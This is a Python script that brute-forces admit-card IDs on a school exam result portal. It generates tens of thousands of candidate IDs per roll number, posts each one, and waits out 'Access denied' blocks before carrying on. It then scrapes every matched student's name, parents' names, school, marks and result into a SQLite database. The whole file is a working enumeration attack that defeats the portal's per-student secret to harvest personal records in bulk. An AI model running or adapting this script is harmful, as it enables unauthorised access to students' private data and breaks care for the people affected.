import requests
import string
import os
import time
import json
import sqlite3

from dotenv import load_dotenv
from bs4 import BeautifulSoup

load_dotenv()

# =========================
# CONFIG
# =========================

URL = os.getenv("URL")
SCHOOL_NO = os.getenv("SCHOOL_NO")
HEADERS = json.loads(os.getenv("HEADERS"))
START_ROLL = int(os.getenv("START_ROLL"))
END_ROLL = int(os.getenv("END_ROLL"))
DB_FILE = os.getenv("DB_FILE")

required = [
    URL,
    SCHOOL_NO,
    HEADERS,
    START_ROLL,
    END_ROLL,
    DB_FILE,
]

if not all(required):
    raise ValueError("Missing environment variables. " "Check .env file")

# =========================
# HEADERS FAILSAFE
# =========================

if "User-Agent" not in HEADERS:

    HEADERS["User-Agent"] = "Mozilla/5.0"

# =========================
# SESSION
# =========================

session = requests.Session()

# =========================
# DATABASE
# =========================


def init_db():

    conn = sqlite3.connect(DB_FILE)

    conn.execute("PRAGMA foreign_keys = ON")

    conn.execute("PRAGMA journal_mode=WAL")

    cursor = conn.cursor()

    # =========================
    # STUDENTS
    # =========================

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS students (

        id INTEGER PRIMARY KEY AUTOINCREMENT,

        roll_no TEXT,
        admit_card_id TEXT,
        school_code TEXT,

        candidate_name TEXT,
        mother_name TEXT,
        father_name TEXT,
        school_name TEXT,

        result TEXT,

        UNIQUE(
            roll_no,
            admit_card_id,
            school_code
        )
    )
    """)

    # =========================
    # SUBJECTS
    # =========================

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS subjects (

        id INTEGER PRIMARY KEY AUTOINCREMENT,

        subject_code TEXT UNIQUE,
        subject_name TEXT
    )
    """)

    # =========================
    # STUDENT MARKS
    # =========================

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS student_marks (

        id INTEGER PRIMARY KEY AUTOINCREMENT,

        student_id INTEGER,
        subject_id INTEGER,

        theory_marks TEXT,
        practical_marks TEXT,
        total_marks TEXT,
        grade TEXT,

        is_additional INTEGER DEFAULT 0,

        UNIQUE(student_id, subject_id),

        FOREIGN KEY(student_id)
            REFERENCES students(id),

        FOREIGN KEY(subject_id)
            REFERENCES subjects(id)
    )
    """)

    # =========================
    # SCRAPE STATUS
    # =========================

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS scrape_status (

        id INTEGER PRIMARY KEY AUTOINCREMENT,

        school_code TEXT,
        roll_no TEXT,

        status TEXT,

        admit_card_id TEXT,

        error_message TEXT,

        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,

        UNIQUE(
            school_code,
            roll_no
        )
    )
    """)

    conn.commit()

    return conn


# =========================
# CLEAN TEXT
# =========================


def clean_text(text):

    return " ".join(text.replace("\xa0", " ").split())


# =========================
# HTML PARSER
# =========================


def parse_result_html(html):

    soup = BeautifulSoup(html, "html.parser")

    page_text = soup.get_text()

    if "Candidate Name" not in page_text:
        return None

    data = {
        "student": {},
        "subjects": [],
    }

    rows = soup.find_all("tr")

    additional_subject = False

    for row in rows:

        cols = row.find_all("td")

        # =========================
        # STUDENT INFO
        # =========================

        if len(cols) == 2:

            key = clean_text(cols[0].get_text()).lower()

            value = clean_text(cols[1].get_text())

            if "roll no" in key:

                data["student"]["roll_no"] = value

            elif "candidate name" in key:

                data["student"]["candidate_name"] = value

            elif "mother" in key:

                data["student"]["mother_name"] = value

            elif "father" in key:

                data["student"]["father_name"] = value

            elif "school" in key:

                data["student"]["school_name"] = value

        # =========================
        # SUBJECT TABLE
        # =========================

        elif len(cols) == 6:

            row_text = clean_text(row.get_text())

            if "Additional Subject" in row_text:

                additional_subject = True

                continue

            first_col = clean_text(cols[0].get_text())

            if first_col in ["", "SUB CODE"]:
                continue

            subject_code = clean_text(cols[0].get_text())

            if not subject_code.isdigit():
                continue

            if additional_subject:

                current_is_additional = 1

                additional_subject = False

            else:

                current_is_additional = 0

            subject = {
                "subject_code": subject_code,
                "subject_name": clean_text(cols[1].get_text()),
                "theory_marks": clean_text(cols[2].get_text()),
                "practical_marks": clean_text(cols[3].get_text()),
                "total_marks": clean_text(cols[4].get_text()),
                "grade": clean_text(cols[5].get_text()),
                "is_additional": current_is_additional,
            }

            data["subjects"].append(subject)

    # =========================
    # RESULT STATUS
    # =========================

    for row in rows:

        row_text = clean_text(row.get_text())

        if "Result :" in row_text:

            result = row_text.split("Result :")[-1].strip()

            data["student"]["result"] = result

            break

    return data


# =========================
# SAVE STUDENT
# =========================


def save_to_db(conn, parsed_data, admit_card_id, school_code):

    cursor = conn.cursor()

    student = parsed_data["student"]

    # =========================
    # INSERT STUDENT
    # =========================

    cursor.execute(
        """
        INSERT OR IGNORE INTO students (

            roll_no,
            admit_card_id,
            school_code,

            candidate_name,
            mother_name,
            father_name,
            school_name,

            result

        )
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            student.get("roll_no"),
            admit_card_id,
            school_code,
            student.get("candidate_name"),
            student.get("mother_name"),
            student.get("father_name"),
            student.get("school_name"),
            student.get("result"),
        ),
    )

    # =========================
    # GET STUDENT ID
    # =========================

    cursor.execute(
        """
        SELECT id
        FROM students
        WHERE roll_no = ?
        AND admit_card_id = ?
        AND school_code = ?
        """,
        (
            student.get("roll_no"),
            admit_card_id,
            school_code,
        ),
    )

    result = cursor.fetchone()

    if not result:
        raise Exception("Student insert failed")

    student_id = result[0]

    # =========================
    # SUBJECTS + MARKS
    # =========================

    for subject in parsed_data["subjects"]:

        # Insert subject

        cursor.execute(
            """
            INSERT OR IGNORE INTO subjects (

                subject_code,
                subject_name

            )
            VALUES (?, ?)
            """,
            (
                subject["subject_code"],
                subject["subject_name"],
            ),
        )

        # Get subject ID

        cursor.execute(
            """
            SELECT id
            FROM subjects
            WHERE subject_code = ?
            """,
            (subject["subject_code"],),
        )

        result = cursor.fetchone()

        if not result:
            continue

        subject_id = result[0]

        # Insert marks

        cursor.execute(
            """
            INSERT OR IGNORE INTO student_marks (

                student_id,
                subject_id,

                theory_marks,
                practical_marks,
                total_marks,
                grade,

                is_additional

            )
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                student_id,
                subject_id,
                subject["theory_marks"],
                subject["practical_marks"],
                subject["total_marks"],
                subject["grade"],
                subject["is_additional"],
            ),
        )

    conn.commit()


# =========================
# SCRAPE STATUS HELPERS
# =========================


def get_roll_status(conn, school_code, roll_no):

    cursor = conn.cursor()

    cursor.execute(
        """
        SELECT status
        FROM scrape_status
        WHERE school_code = ?
        AND roll_no = ?
        """,
        (
            school_code,
            str(roll_no),
        ),
    )

    result = cursor.fetchone()

    if result:
        return result[0]

    return None


def update_roll_status(
    conn,
    school_code,
    roll_no,
    status,
    admit_card_id=None,
    error_message=None,
):

    cursor = conn.cursor()

    cursor.execute(
        """
        INSERT INTO scrape_status (

            school_code,
            roll_no,
            status,
            admit_card_id,
            error_message

        )
        VALUES (?, ?, ?, ?, ?)

        ON CONFLICT(
            school_code,
            roll_no
        )

        DO UPDATE SET

            status = excluded.status,
            admit_card_id = excluded.admit_card_id,
            error_message = excluded.error_message,
            updated_at = CURRENT_TIMESTAMP
        """,
        (
            school_code,
            str(roll_no),
            status,
            admit_card_id,
            error_message,
        ),
    )

    conn.commit()


# =========================
# GENERATOR
# =========================


def generate_ids(roll_no, school_code):

    roll_no = str(roll_no)

    school_code = str(school_code)

    last_two_roll = roll_no[-2:]

    first_two_school = school_code[:2]

    for a in string.ascii_uppercase:

        for b in string.ascii_uppercase:

            for num in range(1, 100):

                suffix = f"{num:02d}"

                yield (f"{a}{b}" f"{last_two_roll}" f"{first_two_school}" f"{suffix}")


# =========================
# INIT DB
# =========================

conn = init_db()

print(f"\n[STARTING]" f" School: {SCHOOL_NO}")

# =========================
# MAIN
# =========================

try:

    for current_roll in range(START_ROLL, END_ROLL + 1):

        print(f"\nChecking Roll: " f"{current_roll}")

        # =========================
        # SKIP COMPLETED
        # =========================

        existing_status = get_roll_status(
            conn,
            SCHOOL_NO,
            current_roll,
        )

        if existing_status == "success":

            print("[SKIPPED] Already success")

            continue

        if existing_status == "failed":

            print("[SKIPPED] Already failed")

            continue

        found = False

        generator = generate_ids(
            current_roll,
            SCHOOL_NO,
        )

        for admit_card_id in generator:

            try:

                payload = {
                    "regno": str(current_roll),
                    "sch": SCHOOL_NO,
                    "admid": admit_card_id,
                }

                response = session.post(
                    URL,
                    data=payload,
                    headers=HEADERS,
                    timeout=20,
                )

                html = response.text

                # =========================
                # BLOCK CHECK
                # =========================

                if "Access denied" in html:

                    print("[BLOCKED]" " Sleeping 60s")

                    update_roll_status(
                        conn,
                        SCHOOL_NO,
                        current_roll,
                        "blocked",
                    )

                    time.sleep(60)

                    continue

                # =========================
                # PARSE RESULT
                # =========================

                parsed = parse_result_html(html)

                # =========================
                # SUCCESS
                # =========================

                if parsed:

                    print(f"[FOUND] " f"{current_roll} " f"-> " f"{admit_card_id}")

                    save_to_db(
                        conn,
                        parsed,
                        admit_card_id,
                        SCHOOL_NO,
                    )

                    update_roll_status(
                        conn,
                        SCHOOL_NO,
                        current_roll,
                        "success",
                        admit_card_id=admit_card_id,
                    )

                    found = True

                    break

                else:

                    print(f"[X] " f"{admit_card_id}")

            except requests.exceptions.Timeout:

                print("[TIMEOUT]")

                time.sleep(3)

            except Exception as e:

                print(f"[ERROR] {e}")

                update_roll_status(
                    conn,
                    SCHOOL_NO,
                    current_roll,
                    "error",
                    error_message=str(e),
                )

                try:

                    with open(
                        "failed_page.html",
                        "w",
                        encoding="utf-8",
                    ) as f:

                        f.write(html)

                except:
                    pass

                time.sleep(2)

        # =========================
        # FULL FAILURE
        # =========================

        if not found:

            print("No valid admit ID found.")

            update_roll_status(
                conn,
                SCHOOL_NO,
                current_roll,
                "failed",
            )

# =========================
# CTRL + C
# =========================

except KeyboardInterrupt:

    print("\n\n[STOPPED]" " Ctrl + C detected")

# =========================
# CLEANUP
# =========================

finally:

    try:
        conn.close()
    except:
        pass

    print("\nDatabase connection closed.")

    print("Program terminated.")
